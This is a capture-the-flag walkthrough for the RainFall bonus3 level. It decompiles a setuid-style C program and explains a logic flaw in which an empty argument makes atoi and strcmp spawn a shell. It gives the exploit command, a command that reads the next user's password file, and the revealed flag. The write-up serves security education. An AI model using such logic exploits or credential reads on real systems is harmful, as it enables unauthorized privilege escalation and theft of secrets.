# RainFall Walkthrough — Bonus3 → end

## Step 1 — Program Structure

The binary is a **C program** that reads a file containing a secret password and compares it to user input:

```c
int main(int argc, struct_0 *argv) {
    char buf[33];
    char second[65];
    FILE *f;

    f = fopen("/home/user/end/.pass", "r");
    memset(buf, 0, 33);

    if (f && argc == 2) {
        fread(buf, 1, 66, f);           // read first line
        buf[atoi(argv->field_4)] = 0;   // terminate at index atoi(input)
        fread(&second, 1, 65, f);       // read second line
        fclose(f);

        if (!strcmp(buf, argv->field_4))
            execl("/bin/sh", "sh");     // spawn shell
        else
            puts(second);
    }
    return 0xffffffff;
}
```

Key points:

* Reads the password file into a fixed-size buffer.
* Uses **`atoi(argv[1])` to determine where to place the terminating null**.
* Compares `buf` against user input.
* Shell spawns only if **strings match exactly** after null-termination.

---

## Step 2 — Vulnerable Logic

The vulnerability is **logical, not a classic buffer overflow**:

1. `atoi(argv[1])` controls the **index at which `\0` is placed**.
2. `strcmp(buf, argv[1])` requires the **buffer to exactly match user input**.
3. Special case: **empty input `""`** sets `atoi("") = 0`, which allows `buf[0] = 0` and matches `""`.

👉 Input `"0"` does **not** work because:

* `atoi("0") = 0`
* `buf[0] = 0` but `argv[1] = "0"`
* `strcmp` fails because `"\0" != "0"`

---

## Step 3 — Exploit Strategy

1. Provide an **empty string** as input (`""`).
2. The program sets `buf[0] = 0`.
3. `strcmp(buf, argv[1])` succeeds because both are empty strings.
4. `execl("/bin/sh", "sh")` is called, spawning a shell.

No shellcode or buffer overflow is needed — this is a **logic-based exploit**.

---

## Step 4 — Memory Visualization

### Before Input

```
buf[0..32] = 0
argv->field_4 = ? (uninitialized until input)
```

### After Input ""

```
atoi("") = 0
buf[0] = 0
argv->field_4 = ""
strcmp(buf, argv->field_4) → match
execl("/bin/sh")
```

### After Input "0"

```
atoi("0") = 0
buf[0] = 0
argv->field_4 = "0"
strcmp(buf, argv->field_4) → mismatch
no shell
```

---

## Step 5 — Running the Exploit

```bash
./bonus3 ""
```

Outcome:

* You are now `end`.
* Can read the password:

```bash
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

* Exit shell:

```bash
$ exit
```

---

## Step 6 — Key Takeaways

* Not all RainFall exploits involve buffer overflows.
* **Logic flaws** using functions like `atoi()` and `strcmp()` can grant shell access.
* Always analyze **how user input is transformed** before comparison.
* Edge cases (empty string, negative numbers) can bypass normal checks.

---

This approach gives the shell **without needing NX bypass or shellcode injection**.